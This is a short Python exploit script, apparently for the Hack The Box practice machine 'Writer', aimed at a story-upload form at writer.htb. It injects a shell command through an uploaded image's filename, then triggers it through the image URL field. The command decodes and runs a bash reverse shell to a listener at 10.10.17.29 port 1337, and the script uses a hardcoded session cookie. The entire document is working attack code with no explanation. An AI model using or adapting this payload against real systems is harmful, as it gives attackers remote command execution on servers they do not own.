#!/usr/bin/python3

import requests
import base64

url = "http://writer.htb/"
lhost = "10.10.17.29"
lport = 1337
session = ".eJyrViotTi1SslJSVyjNy8zPUyhOzUlNLlHIK83J0YlRKkktLolR0gHzUAkFXV0FpVoAtoAVgw.YUrvvQ.oUrjwvJPdhLzaIvR8FlKmjHIEUw"
headers = {
    "Content-Type": "multipart/form-data; boundary=---------------------------31936920783204721086686156998"
}
cookies = {"session": session}


def b64_rev_shell(lhost, lport):
    return base64.b64encode(
        f"bash -c 'exec bash -i &>/dev/tcp/{lhost}/{lport} 0>&1'".encode()
    ).decode()


def get_data(filename, image_url):
    return f"""
-----------------------------31936920783204721086686156998
Content-Disposition: form-data; name="author"

a
-----------------------------31936920783204721086686156998
Content-Disposition: form-data; name="title"

a
-----------------------------31936920783204721086686156998
Content-Disposition: form-data; name="tagline"

a
-----------------------------31936920783204721086686156998
Content-Disposition: form-data; name="image"; filename="{filename}"
Content-Type: image/jpeg

payload file
-----------------------------31936920783204721086686156998
Content-Disposition: form-data; name="image_url"

{image_url}
-----------------------------31936920783204721086686156998
Content-Disposition: form-data; name="content"

a
-----------------------------31936920783204721086686156998--
"""

filename = f"test test.jpg;echo {b64_rev_shell(lhost, lport)} | base64 -d | bash;"

# upload
r = requests.post(
    url + "dashboard/stories/add",
    headers=headers,
    cookies=cookies,
    data=get_data(filename, ""),
)

# execute
r = requests.post(
    url + "dashboard/stories/add",
    headers=headers,
    cookies=cookies,
    data=get_data("", f"file:///var/www/writer.htb/writer/static/img/{filename}"),
)
